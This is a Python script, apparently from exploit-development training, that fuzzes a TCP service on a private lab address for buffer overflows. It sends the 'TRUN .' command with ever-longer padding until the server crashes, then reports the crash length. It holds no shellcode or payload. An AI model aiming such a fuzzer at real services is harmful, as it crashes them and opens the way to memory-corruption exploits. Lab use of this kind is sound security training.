#!/usr/bin/env python3

#  Fuzzing script for Buffer Overflows
#=======================================
#
# Usage:
#        1) Change `ip`, `port` and command (`cmd`) to fuzz
#        2) Run this script
#
# Note
# 	Depending on the reaction of the server on the overflow
# 	a modification of the "try" block might be necessary!

import socket
import sys
import time

ip       = '10.0.2.9'    # Target IP to fuzz
port     = 9999          # Target port to fuzz
cmd      = 'TRUN .'      # Command to fuzz
timeout  = 5             # Connection timeout in seconds
stride   = 100           # Amount of bytes to increase with each time

buffer   = 'C' * stride

# Just adding some colors to the output
class fc:
	cyan = '\033[96m'
	green = '\033[92m'
	orange = '\033[93m'
	red = '\033[91m'
	end = '\033[0m'
	bold = '\033[1m'

# Print the settings
print(f'Fuzzing [{fc.cyan}{cmd}{fc.end}] at [{fc.cyan}{ip}{fc.end}:{fc.cyan}{port}{fc.end}] (Timeout set to: {fc.cyan}{timeout}s{fc.end})')

# Loop forever until the connection crashes
while True:
	try:
		# Print the current amount of bytes to send
		print(f'Attempting [{fc.bold}{len(buffer):8d}{fc.end}] bytes ...', end='\r')

		# Setup a connection
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		s.settimeout(timeout)

		# Receive (and discard) any welcome message
		s.recv(1024)

		# Build and send the fuzzing payload
		message = cmd + ' ' + buffer
		s.send(message.encode('latin1'))

		# Wait for an answer from the server (something like "command completed")
		s.recv(1024)

		s.close()

		# Increase the fuzzing payload for the next attempt
		buffer = buffer + 'C' * stride
		time.sleep(0.2) # be nice

	# Handle CTRL+C (manual abort)
	except KeyboardInterrupt:
		print(f'\n{fc.red}Aborted by user.{fc.end}')
		sys.exit(0)

	# Handle any other exception (for example when the server became unresponsive)
	except Exception as e:
		print(f'\nFuzzing crashed at {fc.bold}{fc.green}{len(buffer)}{fc.end} bytes.')
		print(f'\tError: {fc.orange}{e}{fc.end}')
		sys.exit(0)
